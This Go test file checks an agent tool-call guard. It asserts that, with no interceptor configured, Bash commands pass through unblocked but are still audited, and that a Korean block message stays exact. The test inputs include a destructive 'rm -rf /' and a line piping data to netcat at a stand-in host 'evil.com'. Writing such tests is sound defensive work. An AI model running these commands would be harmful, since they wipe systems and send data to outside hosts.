package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// The platform block remains distinct from target defenses in Korean.
func TestSystemBlockMessageKorean(t *testing.T) {
	got := systemBlockMessage("<原因>")
	want := "[ARTEX Korea 플랫폼 제어 · 대상의 방어 기능 아님] 플랫폼이 이 호출을 차단했습니다. 사유: <原因>. 이 작업은 금지됩니다."
	if got != want {
		t.Errorf("systemBlockMessage framing drifted (한국어 차단 안내):\n got %q\nwant %q", got, want)
	}
}

var _ = hook.PreToolUse
